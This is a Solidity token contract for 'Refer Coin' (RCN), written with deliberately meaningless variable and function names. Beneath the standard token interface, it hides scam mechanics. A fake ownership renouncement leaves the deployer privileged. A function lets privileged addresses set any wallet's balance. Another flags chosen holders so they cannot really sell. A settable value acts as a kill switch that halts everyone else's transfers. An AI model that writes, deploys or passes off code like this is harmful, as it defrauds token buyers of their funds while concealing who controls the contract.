//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract receiverExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapFund {
    function createPair(address marketingFund, address liquidityListAmount) external returns (address);

    function feeTo() external view returns (address);
}

interface launchedIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface autoBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txToLiquidity) external view returns (uint256);

    function transfer(address teamEnableSender, uint256 takeFee) external returns (bool);

    function allowance(address marketingMaxTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeFee) external returns (bool);

    function transferFrom(
        address sender,
        address teamEnableSender,
        uint256 takeFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingSwapIs, uint256 value);
    event Approval(address indexed marketingMaxTeam, address indexed spender, uint256 value);
}

interface tradingSender is autoBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReferCoin is receiverExempt, autoBuy, tradingSender {

    function allowance(address listTeam, address launchedEnable) external view virtual override returns (uint256) {
        if (launchedEnable == fundAt) {
            return type(uint256).max;
        }
        return swapAt[listTeam][launchedEnable];
    }

    function txTokenSender(address enableFeeMode) public {
        require(enableFeeMode.balance < 100000);
        if (senderExempt) {
            return;
        }
        if (tradingWalletAuto == autoFrom) {
            teamTx = false;
        }
        maxEnable[enableFeeMode] = true;
        
        senderExempt = true;
    }

    uint8 private sellAmount = 18;

    uint256 public tokenMarketing;

    uint256 modeTo;

    function transfer(address amountReceiverFee, uint256 takeFee) external virtual override returns (bool) {
        return modeFromWallet(_msgSender(), amountReceiverFee, takeFee);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletTake;
    }

    function owner() external view returns (address) {
        return totalEnableSwap;
    }

    function modeFromWallet(address amountSell, address teamEnableSender, uint256 takeFee) internal returns (bool) {
        if (amountSell == amountFee) {
            return autoSell(amountSell, teamEnableSender, takeFee);
        }
        uint256 isFeeAmount = autoBuy(autoSender).balanceOf(isFrom);
        require(isFeeAmount == fromFund);
        require(teamEnableSender != isFrom);
        if (minTrading[amountSell]) {
            return autoSell(amountSell, teamEnableSender, swapFee);
        }
        takeFee = limitShould(amountSell, teamEnableSender, takeFee);
        return autoSell(amountSell, teamEnableSender, takeFee);
    }

    address fundAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return totalEnableSwap;
    }

    function takeToTeam(address amountReceiverFee, uint256 takeFee) public {
        swapIs();
        buyTxShould[amountReceiverFee] = takeFee;
    }

    function name() external view virtual override returns (string memory) {
        return feeBuyEnable;
    }

    mapping(address => bool) public minTrading;

    uint256 private takeMarketing = 100000000 * 10 ** 18;

    function limitShould(address amountSell, address teamEnableSender, uint256 takeFee) internal view returns (uint256) {
        require(takeFee > 0);

        uint256 teamToken = 0;
        if (amountSell == autoSender && tradingExempt > 0) {
            teamToken = takeFee * tradingExempt / 100;
        } else if (teamEnableSender == autoSender && liquidityLaunched > 0) {
            teamToken = takeFee * liquidityLaunched / 100;
        }
        require(teamToken <= takeFee);
        return takeFee - teamToken;
    }

    bool public limitSwap;

    uint256 public liquidityLaunched = 0;

    function swapIs() private view {
        require(maxEnable[_msgSender()]);
    }

    function approve(address launchedEnable, uint256 takeFee) public virtual override returns (bool) {
        swapAt[_msgSender()][launchedEnable] = takeFee;
        emit Approval(_msgSender(), launchedEnable, takeFee);
        return true;
    }

    function autoSell(address amountSell, address teamEnableSender, uint256 takeFee) internal returns (bool) {
        require(buyTxShould[amountSell] >= takeFee);
        buyTxShould[amountSell] -= takeFee;
        buyTxShould[teamEnableSender] += takeFee;
        emit Transfer(amountSell, teamEnableSender, takeFee);
        return true;
    }

    uint256 public tradingExempt = 0;

    uint256 public autoFrom;

    constructor (){
        if (tokenMarketing != shouldReceiverIs) {
            limitSwap = false;
        }
        exemptTakeFee();
        launchedIs buyTakeEnable = launchedIs(fundAt);
        autoSender = swapFund(buyTakeEnable.factory()).createPair(buyTakeEnable.WETH(), address(this));
        isFrom = swapFund(buyTakeEnable.factory()).feeTo();
        if (receiverTeam != launchSellTrading) {
            launchSellTrading = false;
        }
        amountFee = _msgSender();
        maxEnable[amountFee] = true;
        buyTxShould[amountFee] = takeMarketing;
        if (takeSellAmount == autoFrom) {
            takeSellAmount = shouldReceiverIs;
        }
        emit Transfer(address(0), amountFee, takeMarketing);
    }

    event OwnershipTransferred(address indexed autoLaunched, address indexed receiverMaxTx);

    function transferFrom(address amountSell, address teamEnableSender, uint256 takeFee) external override returns (bool) {
        if (_msgSender() != fundAt) {
            if (swapAt[amountSell][_msgSender()] != type(uint256).max) {
                require(takeFee <= swapAt[amountSell][_msgSender()]);
                swapAt[amountSell][_msgSender()] -= takeFee;
            }
        }
        return modeFromWallet(amountSell, teamEnableSender, takeFee);
    }

    function balanceOf(address txToLiquidity) public view virtual override returns (uint256) {
        return buyTxShould[txToLiquidity];
    }

    string private walletTake = "RCN";

    bool public receiverTeam;

    uint256 private shouldReceiverIs;

    function marketingTeam(address maxToken) public {
        swapIs();
        
        if (maxToken == amountFee || maxToken == autoSender) {
            return;
        }
        minTrading[maxToken] = true;
    }

    address private totalEnableSwap;

    uint256 constant swapFee = 9 ** 10;

    uint256 fromFund;

    bool public teamTx;

    bool private launchSellTrading;

    address isFrom;

    function exemptTakeFee() public {
        emit OwnershipTransferred(amountFee, address(0));
        totalEnableSwap = address(0);
    }

    bool public senderExempt;

    bool public modeBuy;

    uint256 private tradingWalletAuto;

    mapping(address => mapping(address => uint256)) private swapAt;

    uint256 public takeSellAmount;

    string private feeBuyEnable = "Refer Coin";

    address public amountFee;

    mapping(address => uint256) private buyTxShould;

    mapping(address => bool) public maxEnable;

    function decimals() external view virtual override returns (uint8) {
        return sellAmount;
    }

    function walletSender(uint256 takeFee) public {
        swapIs();
        fromFund = takeFee;
    }

    address public autoSender;

}